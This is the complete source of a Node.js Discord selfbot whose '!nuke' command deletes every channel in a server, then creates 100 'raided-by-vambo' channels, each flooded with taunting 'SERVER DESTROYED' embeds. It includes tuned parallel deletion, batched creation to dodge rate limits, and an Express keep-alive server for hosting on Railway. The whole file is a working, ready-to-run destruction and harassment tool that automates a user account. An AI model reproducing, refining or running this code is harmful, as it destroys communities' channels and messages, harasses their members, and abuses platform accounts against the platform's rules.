const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

// ===== HELPER FUNCTIONS =====

// Safe message sender (ignores errors)
async function safeSend(channel, content) {
    try {
        if (channel && !channel.deleted) {
            await channel.send(content);
        }
    } catch (error) {
        // Silently ignore
    }
}

// Create raid embed with your theme
function createRaidEmbed(channelNumber = null) {
    const embed = {
        title: '💀 **SERVER DESTROYED** 💀',
        description: '## RAIDED BY VAMBO\n\n### NEVER SCAM AGAIN SON 😂',
        color: 0xFF0000, // Bright red
        fields: [
            {
                name: '🔥 **STATUS**',
                value: '```Channel purge complete```',
                inline: true
            },
            {
                name: '👑 **RAIDER**',
                value: '```VAMBO```',
                inline: true
            },
            {
                name: '😯 **MESSAGE**',
                value: 'KICK ROCKS',
                inline: true
            }
        ],
        thumbnail: {
            url: 'https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif'
        },
        image: {
            url: 'https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif'
        },
        footer: {
            text: '🔴 SERVER TERMINATED',
            icon_url: 'https://cdn.discordapp.com/emojis/1234567890.gif'
        },
        timestamp: new Date().toISOString()
    };
    
    // Add channel number to title if provided
    if (channelNumber) {
        embed.title = `💀 **CHANNEL ${channelNumber}/100 CREATED** 💀`;
    }
    
    return embed;
}

// Create stats embed for final update
function createStatsEmbed(deletedCount, createdCount, deleteFailed, createFailed) {
    return {
        title: '⚡ **NUKE COMPLETE** ⚡',
        description: '## RAIDED BY VAMBO\n\nAll channels have been destroyed.',
        color: 0x00FF00, // Bright green
        fields: [
            {
                name: '📊 **STATISTICS**',
                value: `\`\`\`diff
✅ Deleted: ${deletedCount} channels
✅ Created: ${createdCount} raid channels
❌ Failed deletions: ${deleteFailed}
❌ Failed creations: ${createFailed}
\`\`\``,
                inline: false
            },
            {
                name: '💀 **FINAL MESSAGE**',
                value: '### NEVER SCAM AGAIN SON 😂\n            😯KICK ROCKS😯',
                inline: false
            }
        ],
        image: {
            url: 'https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif'
        },
        footer: {
            text: '🔴 OPERATION COMPLETE',
            icon_url: 'https://cdn.discordapp.com/emojis/1234567890.gif'
        },
        timestamp: new Date().toISOString()
    };
}

// ===== MAIN BOT LOGIC =====

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== OPTIMIZED NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await safeSend(originalChannel, 'This command only works in servers!');
            return;
        }

        console.log(`💣 Starting optimized nuke on ${guild.name}`);
        
        // Send initial embed (only once)
        const startEmbed = createRaidEmbed();
        await safeSend(originalChannel, { embeds: [startEmbed] });

        // ===== STEP 1: DELETE ALL CHANNELS (MAX SPEED) =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels
        const channels = [...guild.channels.cache.values()];
        
        console.log(`🔍 Found ${channels.length} channels to delete`);
        
        // Delete all channels in parallel (much faster!)
        const deletePromises = channels.map(async (channel) => {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
            } catch (error) {
                deleteFailed++;
                console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
            }
            // Small delay between deletions to avoid rate limits
            await new Promise(resolve => setTimeout(resolve, 300));
        });
        
        // Wait for all deletions to complete
        await Promise.all(deletePromises);
        
        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels`);

        // ===== STEP 2: CREATE 100 RAID CHANNELS (OPTIMIZED) =====
        console.log(`🔥 Creating 100 raid channels...`);
        
        // Channel name base
        const channelNameBase = 'raided-by-vambo';
        
        let createdCount = 0;
        let createFailed = 0;

        // Create channels in batches of 5 for maximum speed while avoiding rate limits
        const BATCH_SIZE = 5;
        const BATCH_DELAY = 2000; // 2 seconds between batches
        
        for (let batch = 0; batch < 20; batch++) { // 20 batches of 5 = 100 channels
            const batchPromises = [];
            
            for (let i = 0; i < BATCH_SIZE; i++) {
                const channelNumber = (batch * BATCH_SIZE) + i + 1;
                if (channelNumber > 100) break;
                
                const channelName = `${channelNameBase}-${channelNumber}`;
                
                batchPromises.push((async () => {
                    try {
                        // Create channel
                        const newChannel = await guild.channels.create(channelName, {
                            type: 'text'
                        });
                        
                        // Send embed in the new channel
                        const channelEmbed = createRaidEmbed(channelNumber);
                        await newChannel.send({ embeds: [channelEmbed] });
                        
                        createdCount++;
                        console.log(`✅ Created channel ${channelNumber}/100`);
                        
                    } catch (error) {
                        createFailed++;
                        console.log(`❌ Failed to create channel ${channelNumber}: ${error.message}`);
                        
                        // If rate limited, wait longer
                        if (error.message.includes('rate')) {
                            console.log('⏳ Rate limited, waiting...');
                            await new Promise(resolve => setTimeout(resolve, 5000));
                        }
                    }
                })());
            }
            
            // Wait for current batch to complete
            await Promise.all(batchPromises);
            
            // Delay between batches
            if (batch < 19) { // Don't delay after last batch
                console.log(`⏱️ Batch ${batch + 1}/20 complete, waiting ${BATCH_DELAY/1000}s...`);
                await new Promise(resolve => setTimeout(resolve, BATCH_DELAY));
            }
        }

        // ===== STEP 3: FINAL STATS (SENT TO LAST CREATED CHANNEL) =====
        console.log('📊 Creating final stats message...');
        
        // Try to find a channel to send final stats (use the last one we created)
        const channelsAfter = [...guild.channels.cache.values()];
        const lastChannel = channelsAfter[channelsAfter.length - 1];
        
        if (lastChannel) {
            try {
                const statsEmbed = createStatsEmbed(deletedCount, createdCount, deleteFailed, createFailed);
                await lastChannel.send({ embeds: [statsEmbed] });
                console.log('✅ Final stats sent');
            } catch (error) {
                console.log('❌ Could not send final stats');
            }
        }

        // Log final results to console
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${createFailed}`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
